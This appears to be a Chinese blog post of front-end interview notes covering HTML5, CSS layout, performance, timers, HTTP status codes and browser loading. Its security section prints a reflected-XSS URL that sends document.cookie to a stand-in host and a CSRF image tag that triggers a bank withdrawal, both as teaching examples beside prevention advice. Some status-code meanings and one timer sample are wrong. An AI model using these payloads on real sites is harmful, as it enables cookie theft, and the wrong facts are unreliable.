---
layout: post
title: "前端面试集锦"
date: 2017-06-22 09:00:00 +0800 
categories: 面试与笔试经历
tag: Interview
---
* content
{:toc}

又又又又又又又又又又又又又到了找工作的季节，各大公司又又又又又又又又又又又又又开始招聘了。我作为一个前端菜鸟，又开始慌了。人生没有一个目的很明确的方向真的会浪费很多时间，而浪费的时间都是青春。努努力力，兜兜转转，又要开始思考自己的人生方向了。时间来不及去荒废了，就像歌里面唱的：`来不及认真地年轻，就认真地老去`。

就算很多公司不要你，你也要知道，哪怕现在的你不优秀，也并不意味着你永远不优秀。

按照时间线分割。

<!-- more -->

<!-- TOC -->

- [HTML5新增了哪些内容或API](#html5新增了哪些内容或api)
- [怎么理解HTML语义化](#怎么理解html语义化)
- [HTML5的`<!DOCTYPE>`标签](#html5的doctype标签)
- [`<input>`和`<textarea>`的区别](#input和textarea的区别)
- [图片懒加载 -- Lazy Load](#图片懒加载----lazy-load)
- [移动端性能优化](#移动端性能优化)
        - [加载优化 -- 优化重点](#加载优化----优化重点)
        - [图片优化](#图片优化)
        - [CSS优化](#css优化)
        - [脚本优化](#脚本优化)
        - [渲染优化](#渲染优化)
- [repaint/reflow 区别](#repaintreflow-区别)
- [CSS盒模型](#css盒模型)
- [前端安全](#前端安全)
        - [XSS攻击](#xss攻击)
        - [CSRF攻击](#csrf攻击)
- [实现布局:左边一张图片，右边一段文字](#实现布局左边一张图片右边一段文字)
        - [行内元素](#行内元素)
        - [块级元素](#块级元素)
- [伪类和伪元素的区别](#伪类和伪元素的区别)
- [window.onload和$(document).ready()的区别](#windowonload和documentready的区别)
- [浏览器加载转圈结束是哪个时间点](#浏览器加载转圈结束是哪个时间点)
- [setTimeout和setInterval区别](#settimeout和setinterval区别)
        - [setTimeout 超时调用](#settimeout-超时调用)
        - [setInterval 间歇调用](#setinterval-间歇调用)
        - [如何转化](#如何转化)
- [数组去重](#数组去重)
        - [ES6的Set](#es6的set)
        - [普通方法](#普通方法)
        - [hash](#hash)
- [http状态码401和403区别，301和302的区别](#http状态码401和403区别301和302的区别)
- [使用flex布局实现三等分](#使用flex布局实现三等分)
- [BOM和DOM的区别](#bom和dom的区别)
- [类数组转化为数组](#类数组转化为数组)
- [Bootstrap栅格系统](#bootstrap栅格系统)
- [实现两栏布局](#实现两栏布局)
- [实现三栏布局](#实现三栏布局)
- [JavaScript为什么是单线程](#javascript为什么是单线程)
- [从输入URL到页面加载发生了什么](#从输入url到页面加载发生了什么)
- [进程和线程的区别](#进程和线程的区别)
- [JavaScript的严格模式](#javascript的严格模式)
        - [开启严格模式](#开启严格模式)
        - [严格模式举例](#严格模式举例)
- [文本不换行](#文本不换行)
- [事件冒泡和事件流](#事件冒泡和事件流)
        - [如何取消事件的冒泡](#如何取消事件的冒泡)
- [事件代理或委托](#事件代理或委托)
        - [事件代理/委托](#事件代理委托)
- [JavaScript 的内存泄露](#javascript-的内存泄露)
    - [JavaScript 的内存管理](#javascript-的内存管理)
    - [常见的造成内存泄露](#常见的造成内存泄露)
        - [意外的全局变量](#意外的全局变量)
        - [被遗忘的计时器或回调函数](#被遗忘的计时器或回调函数)
        - [脱离 DOM 的引用](#脱离-dom-的引用)
        - [闭包](#闭包)
    - [检测内存占用的工具](#检测内存占用的工具)
- [清除浮动](#清除浮动)
    - [使用带 clear 属性的空元素](#使用带-clear-属性的空元素)
    - [使用 overflow: hidden;](#使用-overflow-hidden)
- [Cookies 和 Sessions](#cookies-和-sessions)
- [隐藏页面元素的 CSS 方法](#隐藏页面元素的-css-方法)
- [设计一个点击回到顶部的方法](#设计一个点击回到顶部的方法)
- [稳定排序和不稳定排序](#稳定排序和不稳定排序)
- [移动端和 pc 端的区别归纳](#移动端和-pc-端的区别归纳)
        - [click 和 touch 事件](#click-和-touch-事件)
        - [需要设置 viewport](#需要设置-viewport)
        - [rem/em](#remem)
        - [-webkit-appearance: none](#-webkit-appearance-none)
        - [手机端字体显示](#手机端字体显示)
        - [iphone6 和 iphone 6s 的三倍屏](#iphone6-和-iphone-6s-的三倍屏)
        - [设备分界点的阈值](#设备分界点的阈值)
        - [最小点击区域](#最小点击区域)
        - [一像素边框的问题](#一像素边框的问题)
        - [一行和多行文本溢出](#一行和多行文本溢出)
        - [Tap 事件和点透问题](#tap-事件和点透问题)
- [CSS3 新特性](#css3-新特性)
    - [弹性盒 flex](#弹性盒-flex)
    - [边框](#边框)
        - [border-radius](#border-radius)
        - [box-shadow](#box-shadow)
        - [border-image](#border-image)
    - [CSS3 背景](#css3-背景)
        - [background-size](#background-size)
        - [background-origin](#background-origin)
    - [CSS3 文本和字体](#css3-文本和字体)
        - [text-shadow](#text-shadow)
        - [text-wrap](#text-wrap)
        - [@font-face](#font-face)
    - [CSS3 transform](#css3-transform)
    - [CSS3 transition](#css3-transition)
    - [CSS3 @keyframes](#css3-keyframes)
    - [CSS3 文本多列](#css3-文本多列)
    - [box-sizing](#box-sizing)
- [HTML5 的 history API](#html5-的-history-api)

<!-- /TOC -->

`2017-04-25`

## HTML5新增了哪些内容或API

+ 增加了语义性内容标签： `<article>`、`<footer>`、`<header>`、`<nav>`、`<section>`
+ 新的表单控件
+ 用于绘图的`canvas`元素
+ 用于媒体回放的`video`和`audio`元素
+ 对本地离线存储的更好的支持

---

## 怎么理解HTML语义化

简而言之，语义化的含义就是使用正确的标签做正确的事。其主要目的还是想让机器读懂网页，而程序员次之。HTML语义化让页面内容结构化，便于搜索引擎的机器人(爬虫)解析，利于SEO。

> 参考: [如何理解Web语义化？](https://www.zhihu.com/question/20455165)

---

## HTML5的`<!DOCTYPE>`标签

html5文档的声明如下:

```html
<!DOCTYPE HTML>
````

为什么html5只需这样定义就好？？？

因为html5不在基于`SGML`(Standard Generalized Markup Language, 标准通用标记语言)，所以不需要对DTD(Document Type Definition)进行引用。

> 参考: [HTML <!DOCTYPE> Declaration](https://www.w3schools.com/tags/tag_doctype.asp)

---

## `<input>`和`<textarea>`的区别

`<input>`是一个单行输入框，有value属性，不能自动换行。

`<textarea>`是一个多行输入框，没有value属性，可以自动换行。

---

## 图片懒加载 -- Lazy Load

是延迟加载的一种方式。直到滚动图片出现在用户可视范围内才把它加载出来，与图片预加载技术完全相反。

懒加载的主要实现是通过计算得到什么时候图片会出现在可视范围内。所以要把视口高度、滚动条距离和图片所在的高度进行对比。当前两者的和大于后者，就将图片显示出来。这里有一个自己写的实现:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>lazy loading</title>

    <style>
        img {
            display: block;
            margin: 10px auto;
        }
    </style>
</head>
<body>
<div class="images">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
    <img src="http://via.placeholder.com/350x150" data-scr="images/test.jpg">
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
    //使用原生JavaScript实现
    var imgs = document.getElementsByTagName('img');

    function  lazyLoading() {
        //获取滚动条偏移量
        var scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
        // 获取视口高度
        var viewportSize = window.innerHeight || document.documentElement.clientHeight;

        for (var i = 0; i < imgs.length; i++){
            var x = scrollTop + viewportSize - imgs[i].offsetTop;
            if ( x > 0){    //如果图片暴露在视野范围之内
                imgs[i].src = imgs[i].getAttribute('data-scr'); //将自定义属性的值赋给src
            }
        }
    }
    lazyLoading();
    window.addEventListener('scroll', lazyLoading, false);
    /*
    //使用jQuery实现
    $(document).ready(function () {
        var lazyLoading = function () {
            var scrollTop = $(window).height();
            var viewportSize = $(window).scrollTop();

            $('img').each(function () {
                var x = scrollTop + viewportSize - $(this).position().top;
                if (x > 0){
                    $(this).attr('src', $(this).attr('data-scr'));
                }
            });
        }
        window.addEventListener('scroll', lazyLoading, false);
    });*/
</script>

</body>
</html>
```

**注意**: jQuery有一个用于实现懒加载的[`lazyload`插件](http://appelsiini.net/projects/lazyload/)

> [参考1](https://segmentfault.com/a/1190000008840116)，[参考2](https://zhuanlan.zhihu.com/p/25455672)

---

## 移动端性能优化

####  加载优化 -- 优化重点

+ **减少HTTP请求**
  + 合并CSS、JavaScript
  + 合并小图片，使用雪碧图
+ **压缩**
  + 压缩HTML/CSS/JavaScript
  + 启用GZip(?)
+ **利用缓存** -- 利用缓存可以减少向服务器的请求数，节省加载时间，所以所有静态资源都可以在服务器端设置缓存
  + 缓存一切可缓存的资源
  + 使用长Cache(?)
  + 使用外联式引用CSS/JavaScript
+ 使用首屏加载 -- 首屏是用户最直观的体验，针对首屏快速显示做优化
+ 按需加载 -- 将不影响首屏的资源和当前屏幕资源不用的资源放到用户需要时才加载
  + 滚屏加载
  + LazyLoad
  + 通过Media Query加载
+ 预加载 -- 增加Loading进度条 
+ 减少Cookie -- Cookie会影响加载速度，所以静态资源域名不使用Cookie
+ 避免重定向 -- 重定向会影响加载速度，所以在服务器正确设置避免重定向
+ 异步加载第三方资源 -- 第三方资源不可控会影响页面的加载和显示，因此要异步加载第三方资源

#### 图片优化

+ 使用(CSS3/SVG/IconFont)替代图片
+ [使用`Srcset`]({{ '/2017/05/25/High-Performance-Responsive-Design' | prepend: site.baseurl }})
+ WebP格式优于JPG， PNG8优于GIF
+ 图片不宽于640

####  CSS优化

+ 尽量避免重设图片大小
+ 图片尽量避免使用DataURL
+ 尽量避免使用内联CSS(即在HTML标签中写Style属性)
+ 移除空的CSS规则
+ 正确使用Display的属性
  + display:inline后不应该再使用width、height、margin、padding以及float
  + display:inline-block后不应该再使用float
  + display:block后不应该再使用vertical-align
  + display:table-*后不应该再使用margin或者float
+ 不滥用Float -- Float在渲染时计算量比较大，尽量减少使用
+ 不滥用Web字体 -- Web字体需要下载，解析，重绘当前页面，尽量减少使用
+ 不声明过多的Font-Size -- 过多的Font-size引发CSS树的效率
+ 标准化各种浏览器前缀
  + 无前缀应放在最后
  + CSS动画只用（-webkit- 无前缀）两种即可
  + 其它前缀为 -webkit- -moz- -ms- 无前缀 四种

#### 脚本优化

+ 减少重绘和回流
+ 缓存DOM选择与计算
+ 缓存列表.length
+ 尽量使用事件代理，避免批量绑定事件
+ 尽量使用ID选择器(???)
+ 使用touchstart、touchend代替click(???)

#### 渲染优化

+ HTML使用Viewport -- `<meta name="viewport" content="width=device-width, initial-scale=1">`
+ 减少DOM节点
+ 尽量使用CSS3动画
+ 合理使用requestAnimationFrame动画代替setTimeout
+ 适当使用Canvas动画
+ Touchmove、Scroll事件会导致多次渲染

> [参考](http://isux.tencent.com/h5-performance.html)

---

## repaint/reflow 区别

在这开始之前，我们可以先了解一下**浏览器的渲染过程**，下面是几个可靠的文章。

+ [How browsers work](http://taligarsiel.com/Projects/howbrowserswork1.htm) 神文
+ [浏览器的渲染原理简介](http://coolshell.cn/articles/9666.html)

`repaint`: 屏幕的一部分需要重画，但是元素的尺寸没有变，只是外观变了。比如:

+ visibility
+ outline
+ background color

`reflow`: 元素的几何尺寸变了，需要重新布局，重新计算Render tree。 比如:

+ 改变窗口大小
+ 改变字体
+ 增加或删除样式表
+ 内容的改变
+ 激活伪类
+ 操作class属性
+ 脚本操作DOM
+ 设置style属性
+ 计算offsetWidth和offsetHeight

所以，`display:none`触发reflow，而`visibility:hidden`触发repaint。

另外，可以这么说，reflow一定会产生repaint。

所以说，reflow对性能的影响更大。为了避免这种影响，尽量做到:

1. 直接改变向改变的元素，避免通过父元素作用于子元素
2. 避免设置大量的style属性，因为通过设置style属性改变结点样式的话，每一次设置都会触发一次reflow，所以最好是使用class属性
3. 实现元素的动画，它的position属性，最好是设为absoulte或fixed，这样不会影响其他元素的布局
4. 避免table布局，因为table中某个元素旦触发了reflow，那么整个table的元素都会触发reflow

> [参考](https://segmentfault.com/a/1190000006104095)

---

## CSS盒模型

每个元素都表示为一个矩形的盒子。渲染引擎的目的，就是确定这些盒子的尺寸，属性和位置。

![box-model]({{ '/styles/images/interview/box-model.svg' | prepend: site.baseurl }})

+ 内容区: 包含元素真实内容的区域。`height`和`width`用来指定内容区的高度
+ 内边距: 内容与边框之间的间隔。这段距离使用`padding`控制
+ 边框: 边框很好理解，可以设置为不可见(`0px`)。有`boder-width`/`border-style`/`boder-color`等属性
+ 外边距: 用于将两个标签隔开。`margin`控制

> 有些属性，比如`background-color`，会填充边框以内的空白，包括内边距部分。

![box-model]({{ '/styles/images/interview/box-model.png' | prepend: site.baseurl }})

所以盒子边框如何计算。总宽度 = 宽度 + 左右内边距 + 左右边框宽度 + 左右外边距。

CSS3增加了一种新的计算盒子宽度的方式 - `box-sizing`。有三个可选值

+ `content-box`: 浏览器计算宽度和高度的常规方式，默认方式。边框和内边距加到所设宽度和高度上，用来确定元素在屏幕中所占的宽度和高度。
+ `padding-box`: width 和 height属性的值包括内边距。
+ `border-box`: 内边距和边框的宽度都包含在width 和 height中。

> [参考](https://leohxj.gitbooks.io/front-end-database/html-and-css-basic/box-module.html)

---

## 前端安全

#### XSS攻击

XSS(Cross-Site Scripting): 跨站脚本攻击。它允许攻击者将恶意代码植入到用户使用的页面中。攻击目标是**为了盗取存储在客户端的cookie或者其他网站用于识别客户端身份的敏感信息**。

XSS通常可以分为两大类：一类是**存储型XSS**，主要出现在让用户输入数据，供其他浏览此页的用户进行查看的地方，包括留言、评论、博客日志和各类表单等。应用程序从数据库中查询数据，在页面中显示出来，攻击者在相关页面输入恶意的脚本数据后，用户浏览此类页面时就可能受到攻击。这个流程简单可以描述为:恶意用户的Html输入Web程序->进入数据库->Web程序->用户浏览器。另一类是**反射型XSS**，主要做法是将脚本代码加入URL地址的请求参数里，请求参数进入程序后在页面直接输出，用户点击类似的恶意链接就可能受到攻击。

XSS的原理

Web应用未对用户提交请求的数据做充分的检查过滤，允许用户在提交的数据中掺入HTML代码(最主要的是“>”、“<”)，并将未经转义的恶意代码输出到第三方用户的浏览器解释执行，是导致XSS漏洞的产生原因。

> 比如: 访问有个网站http://127.0.0.1/?name=maoxiaoke会输出用户名字。如果恶意用户传递这样的url：http://127.0.0.1/?name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'+document.cookie&#60;/script&#62;，这样就可以把当前的cookie发送到指定的站点：www.xxx.com。

如何预防XSS

答案很简单，坚决不要相信用户的任何输入，并过滤掉输入中的所有特殊字符。这样就能消灭绝大部分的XSS攻击。

+ 将用户所提供的内容进行过滤
+ 使用HTTP头指定类型

> [参考](https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.3.md)

#### CSRF攻击

CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。

可以这样简单的理解：攻击者可以盗用你的登陆信息，以你的身份模拟发送各种请求。举个栗子，一家银行用于执行转账操作的URL地址如下: http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName。一个恶意攻击者在另一个网站放置如下放置如下代码: `<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">`。如果有一个用户访问了这个恶意站点，而他之前刚访问过银行不久，登陆信息尚未过期。攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是**欺骗用户浏览器，让其以用户的名义执行操作**。

从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤 ：

1.登录受信任网站A，并在本地生成Cookie 
2.在不退出A的情况下，访问危险网站B

如何预防CSRF攻击？

CSRF的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的CSRF防御也都在服务端进行。

服务端的预防CSRF攻击的方式方法有多种，但思想上都是差不多的，主要从以下2个方面入手：

1、正确使用GET,POST和Cookie
2、在非GET请求中增加伪随机数
  + 为每个用户生成一个唯一的cookie token，所有表单都包含同一个伪随机值
  + 每个请求使用验证码
  + 不同的表单包含一个不同的伪随机值

> [参考](https://github.com/astaxie/build-web-application-with-golang/blob/master/zh/09.1.md)

---

## 实现布局:左边一张图片，右边一段文字

目的是查看CSS布局，一种是可以使用`float`(浮动)，另一种可以使用`flex`(弹性盒)。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Picture</title>
    <style>
    body {
        display: flex;
    }
    /*using float
    img {
        float: left;
        }
    */
    </style>
</head>
<body>
    <div>
        <img src="https://unsplash.it/200/300/?random" alt="me">
    </div>
    <div>
    <p>Bacon ipsum dolor amet chuck tri-tip kielbasa ham. Tenderloin pork chop doner, biltong kielbasa beef ribs meatball turducken landjaeger fatback chicken ham hock short loin swine. Chuck salami kevin filet mignon sausage jowl. Meatball jowl pork turkey tri-tip. Shank flank beef ribs, rump alcatra turkey t-bone strip steak jerky meatloaf salami cow doner sausage drumstick. Sirloin flank spare ribs, rump ham ribeye kevin pancetta brisket jerky turducken pork chop.</p>
    </div>
</body>
</html>
```

现在我们来复习以下行内元素和块级元素。

#### 行内元素

一个行内元素只占据它对应标签的边框所包含的空间。默认情况下不会以新行开始。

+ b, big, i, small, tt
+ abbr, acronym, cite, code, dfn, em, kbd, strong, samp, var
+ a, bdo, br, img, map, object, q, script, span, sub, sup
+ button, input, label, select, textarea

#### 块级元素

默认情况下，块级元素会新起一行。

虽然”块级“在新的 HTML5 元素中没有明确定义

+ article, aside, audio, canvas, figcaption, figure, footer, header, hgroup, output, section, video
+ blockquote, address, dd, div, dl, fieldset, form, h1, h2, h3, h4, h5, h6, hr, noscript, ol, p, pre, table, tfoot, ul

---

## 伪类和伪元素的区别

伪类操作对象是文档中已有的元素，而伪元素是创建了一个文档外的元素。比如`a:hover`伪类是对已有的`<a>`进行操作，而`a:before`伪元素是在指定元素之前添加内容。

如何区分伪类和伪元素呢？很简单，伪元素就那么几个:

+ `:before` `:after`
+ `:first-letter` `:first-line`
+ `::selection` `:placeholder` `::backdrop`

> [参考](http://www.alloyteam.com/2016/05/summary-of-pseudo-classes-and-pseudo-elements/)

---

## window.onload和$(document).ready()的区别

+ `window.onload`必须等到页面内包括图片的所有元素加载完毕后才能执行，`$(document).ready()`是DOM结构绘制完毕后就执行，不必等到加载完毕
+ `window.onload`不能同时编写多个，如果有多个`window.onload`方法，只会执行一个，`$(document).ready()`可以同时编写多个，并且都可以得到执行
+ `window.onload`没有简化写法，`$(document).ready(function(){})`可以简写成`$(function(){})`

---

## 浏览器加载转圈结束是哪个时间点

![timing-overview]({{ '/styles/images/interview/timing-overview.png' | prepend: site.baseurl }})

> [图片来源](https://www.w3.org/TR/navigation-timing/)

所以这个时间点是`loadEventEnd`。

具体可参考:

+ [navigation-timing](https://www.w3.org/TR/navigation-timing/)
+ [Navigation Timing API](https://developer.mozilla.org/en-US/docs/Web/API/Navigation_timing_API)
+ [浏览器加载各时间节点对应的状态](http://blog.csdn.net/melody_day/article/details/53505451)

---

## setTimeout和setInterval区别

#### setTimeout 超时调用

因为JavaScript有一个任务队列的要求，所以`setTimeout()`精度不会太高。它返回一个超时调用的ID，可以用来取消超时调用，即将它传递给`clearTimeout()`。

#### setInterval 间歇调用

它会在指定的时间间隔重复执行代码，直至间歇调用被取消或者页面被卸载。但是，回调加入到队列中不管函数是否被执行就开始执行下一次计时，那么当下一次时间到的时候，定时器又向队列中加入回调函数，但此时发现之前的加入的函数还未被执行，此时便会将之后的定时函数取消掉，造成缺失间隔。(这里表示疑问)

#### 如何转化

可以用`setTimeout()`来模拟`setInterval()`，方法就是使用递归。比如:

```js
//setTimeout()
function myTimeoutFunction()
{
    console.log('i am timi');
    setTimeout(myTimeoutFunction, 1000);
}
myTimeoutFunction();
```

功能与下面的代码一致。

```js
function myTimeoutFunction(){
    console.log('i am timi');
}
myTimeoutFunction();
setInterval(myTimeoutFunction, 1000);
```

但是，两者也不是完全没有区别。对于`setTimeout()`而言，必须等待任务队列中的任务完成，才开始进行下一次调用。而`setInterval()`只在定时之后将任务加入队列，才不管是否被执行，所以`setTimeout()`时间花费更大。

另一个问题是，如果想要取消执行。`setInterval()`要更为简单。

```
function myTimeoutFunction(){
    console.log('i am timi');
}
myTimeoutFunction();
var timeId = setInterval(myTimeoutFunction, 1000);

//later on...
clearInterval(timerId);
```

然而，`setTimeout()`需要跟踪每次的迭代。

```js
var timeId = null;
function myTimeoutFunction()
{
    console.log('i am timi');
    timerId = setTimeout(myTimeoutFunction, 1000);
}
myTimeoutFunction();

//later on...
clearTimeout(timerId);
```

> [参考](https://stackoverflow.com/questions/729921/settimeout-or-setinterval)

---

## 数组去重

#### ES6的Set

```js
let arr=[1,1,2,2,'1','1','11',NaN,NaN,,,];
[...new Set(arr)];  //[ 1, 2, '1', '11', NaN, undefined ]
```

#### 普通方法

```js
function unique(array){
    var n = [];//临时数组
    for(var i = 0;i < array.length; i++){
        if(n.indexOf(array[i]) == -1) n.push(array[i]);
    }
    return n;
}
let arr=[1,1,2,2,'1','1','11',NaN,NaN,,,];
console.log(unique(arr));   //[ 1, 2, '1', '11', NaN, NaN, undefined ]
```

> 这个有一个问题，就是`NaN`无法去重，可以单独列出来。

#### hash

```js
function unique(arr) {
  var ret = [];
  var hash = {};

  for (var i = 0; i < arr.length; i++) {
    var item = arr[i];
    var key = typeof(item) + item;
    if (hash[key] !== 1) {
      ret.push(item);
      hash[key] = 1;
    }
  }

  return ret;
}
let arr=[1,1,2,2,'1','1','11',NaN,NaN,,,];
console.log(unique(arr));
```

> [参考](http://sentsin.com/web/63.html)

---

## http状态码401和403区别，301和302的区别

1xx消息: 这一类状态码，代表请求已被接受，需要继续处理。这类响应是临时响应。

2xx**成功**: 代表请求被服务器接收，理解和接受。

+ 200 OK 请求成功
+ 201 Accepted 服务器接受请求，但尚未处理
+ 203 No Content 服务器成功处理请求，没有返回任何内容

3xx**重定向**

+ 301 Moved Permanently 被请求的资源已永久移动到新位置
+ 302 Found 要求客户端执行临时重定向
+ 304 Not Modified 资源未被修改。客户端执行了 GET，服务器从缓存中调用访问内容发现内容没有更新，返回一个 304 状态码

4xx**客户端错误**

+ 400 Bad Request 明显的错误，服务器不能或不会处理该请求
+ 401 Unauthorized 未认证，即用户没有必要的凭据。该请求码表示当前请求需要用户验证
+ 403 Forbidden 服务器已经理解请求，但是拒绝执行它
+ 404 Not Found 请求失败
+ 407 Request Timeout 请求超时

5xx**服务器错误**

+ 500 Internal Server Error 通用错误信息

现在我们谈一下401和403的区别，这个问题在Stack Overflow上获得很大的关注: [403 Forbidden vs 401 Unauthorized HTTP responses](https://stackoverflow.com/questions/3297048/403-forbidden-vs-401-unauthorized-http-responses)

401: Unauthorized，未认证。收到一个401状态码意味着服务器告诉你`你没有认证或者认证错误，但是还可以再试一边，重新认证`。

403: Forbidden，未授权。收到一个403状态码意味着服务器告诉你`我知道你是谁，但是对不起，你没有访问资源的权限你也许可以向管理员询问权限，但是在此之前，不要来烦我了`。

301和302的区别也获得很大的关注:[HTTP redirect: 301 (permanent) vs. 302 (temporary)](https://stackoverflow.com/questions/1393280/http-redirect-301-permanent-vs-302-temporary)

301: Moved Permanently 永久重定向。意味着页面(或资源)被永久移动到新地址了，浏览器不会去试图请求原来的地址，而是直接请求新地址。对于搜索引擎爬虫而言，直接使用新URL将原来的URL替换，同时保留原来网页的流量、排名等等

302: Found 临时重定向。意味着页面(或资源)被临时移动到新地址了。原来的地址URL仍然存在搜索引擎的数据库里，浏览器总是会试图访问原来的地址。

> 其他有关状态码的，你可以参考[HTTP Diagram and Status Codes](https://www.loggly.com/blog/http-status-code-diagram/)

## 使用flex布局实现三等分

题目要求: 使用flex布局实现三等分，左右两个元素分别贴到左边和右边，垂直居中

<p data-height="265" data-theme-id="light" data-slug-hash="bRZzwo" data-default-tab="css,result" data-user="maoxiake" data-embed-version="2" data-pen-title="a flex layout" class="codepen">See the Pen <a href="https://codepen.io/maoxiake/pen/bRZzwo/">a flex layout</a> by maoxiaoke (<a href="https://codepen.io/maoxiake">@maoxiake</a>) on <a href="https://codepen.io">CodePen</a>.</p>
<script async src="https://production-assets.codepen.io/assets/embed/ei.js"></script>

可参考: [Flexbox的完全教程]({{ '/2017/07/15/Flex' | prepend: site.baseurl }})

---

## BOM和DOM的区别

- BOM (Browser Object Model) 浏览器对象模型

核心对象是`window`，它表示浏览器的一个实例。window下又包括`navigator`, `history`, `screen`, `location` 和 `document`等对象，其中`document`就是`DOM`。

- DOM (Document Object Model) 文档对象模型，完整写法应该是`window.document`，形成的DOM树可以使用JavaScript来操纵。

![BOM和DOM]({{ '/styles/images/interview/bomanddom.png' | prepend: site.baseurl }})

> 参考: [JavaScript中的BOM与DOM详解](http://m.blog.csdn.net/Sornets/article/details/46999227) [What is the DOM and BOM in JavaScript?](https://stackoverflow.com/questions/4416317/what-is-the-dom-and-bom-in-javascript)

---

## 类数组转化为数组

类数组，具有指向对象元素的数字索引下标以及length属性，但是却不具有常见的`push()`、`forEach()`、`sort()`等数组对象具有的方法。

常见的类数组对象有: `NodeList`和`HTMLCollection`对象，通过以下方式获得。

+ document.getElementsByTagName()
+ document.getElementsByClassName()
+ document.getElementsByName()
+ parentNode.chidlNodes
+ arguments

使用`slice()`将类数组对象和集合转换成一个数组。方法是:

```js
Array.prototype.slice.call(array-like);
//or
[].slice.call(arguments);
```

> 参考: [javascript类数组转换为数组](http://www.zuojj.com/archives/218.html)  [Array.prototype.slice()](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array/slice)

---

## Bootstrap栅格系统

Bootstrap提供了一套响应式、移动设备优先的流式栅格系统，随着屏幕或视口(viewport)尺寸的增加，系统会自动分为最多12列。大概的方式如下:

```html
<div class="container">
  <div class="row">
    <div class="col-md-1"> .col-md-1 </div>
    ...
  </div>
</div>
```

+ 行必须包含在`.container`或`.container-fluid`中。
+ 内容放在列中，列是作为行(`row`)的直接子元素。

当然，最首先是使用媒体查询来创建分界点。

---

## 实现两栏布局

这里的两栏布局，指的是**左边定宽，右边自适应**。方法以是可以用浮动布局，然后用`margin-left`设定左边的距离。第二种方法是利用`flex`布局。

我有总结过，看这里。[两栏布局]({{ '/2017/07/16/Two-or-Three' | prepend: site.baseurl }})

---

## 实现三栏布局

这里的三栏布局，指的是常见的一种网站布局。**左右两栏宽度固定，中间栏宽度自适应**。这种布局方式也称为**Holy Grail**(圣杯)布局。也就是下面的样子。

我有总结过，看这里。[三栏布局]({{ '/2017/07/16/Two-or-Three' | prepend: site.baseurl }})

---

## JavaScript为什么是单线程

> 单线程最大的好处是不用像多线程那样处处在意状态的同步问题，没有死锁的存在，也没有线程上下文交换带来的性能上的开销。 -- <<深入浅出node>>

所以，单线程的优点是针对多线程而来的，指的就是同一时间只能做一件事情。JavaScript作为脚本语言，主要用途是交互和操纵DOM，这决定于它是单线程，否则会带来很多同步问题。假如JavaScript是多线程，有两个线程，一个想在DOM一个节点上添加内容，一个想删除这个节点，这个时候浏览器以谁为准呢？

单线程也有自身的缺点。

+ 无法使用多核CPU
+ 一个错误会导致整个应用退出
+ CPU被长时间占用和空闲，大量计算的时候，CPU会被长时间占用。而I/O设备读取很慢，会造成CPU长时间空闲

HTML5制订了Web Worker标准解决了大计算的问题，允许JavaScript创建工作线程来进行计算。工作线程通过消息传递的方式(如工作线程`postmessage()`，而主线程`onmessage()`的方式)来传递结果。这也就是说，工作线程无法访问主线程的UI，也就是说子线程无法操纵DOM。本质仍然是单线程。

也因为JavaScript单线程的原因，也延伸出**异步编程**的概念。在这里[Node异步编程]({{ '/2017/06/07/Asyn-Programing' | prepend: site.baseurl }})

---

## 从输入URL到页面加载发生了什么

要说清楚，东西还挺多。

1. 在浏览器输入URL
2. 如果请求对象在缓存且还未过期，直接到第八步
3. 连接到DNS(域名系统)，找到域名对应的IP地址
  
有时候我们会说，为啥需要ip地址呢，除了便于记忆外，对于很多大型网站，在不同地点有多个服务器。所以，我们输入域名，可以让Google自己决定使用哪个服务器。DNS的步骤如下:

  + 查看浏览器缓存，看是否保留DNS记录
  + 查看操作系统缓存
  + 查看路由缓存
  + 查看ISP缓存
4. 浏览器和服务器启动TCP连接
5. 浏览器向服务器发送一个HTTP请求
6. 服务器处理请求(一般先返回一个HTML文档)
7. 浏览器收到HTTP响应
8. 浏览器开始渲染页面
9. 浏览器请求HTML文件里的其他资源
10. 用户和服务器交互，比如通过表单提交，另一种通过AJAX请求。

> 参考: [What happens when you type a URL in browser](http://edusagar.com/articles/view/70/What-happens-when-you-type-a-URL-in-browser)  [What really happens when you navigate to a URL](http://igoro.com/archive/what-really-happens-when-you-navigate-to-a-url/)  [从输入URL到页面加载发生了什么？](https://segmentfault.com/a/1190000006879700)

---

## 进程和线程的区别

简单说，线程是进程的子集。所有的线程都共享内存空间(进程创建的)，而不同的进程有自己的内存空间。线程的开销小，进程的开销大。一个应用程序包含一个或多个进程，最简单的讲，是一个执行程序；一个或多个线程运行在进程的上下文中，线程是操作系统配置处理器时间的基本单元。

> [What is the difference between a process and a thread?](https://stackoverflow.com/questions/200469/what-is-the-difference-between-a-process-and-a-thread)

---

## JavaScript的严格模式

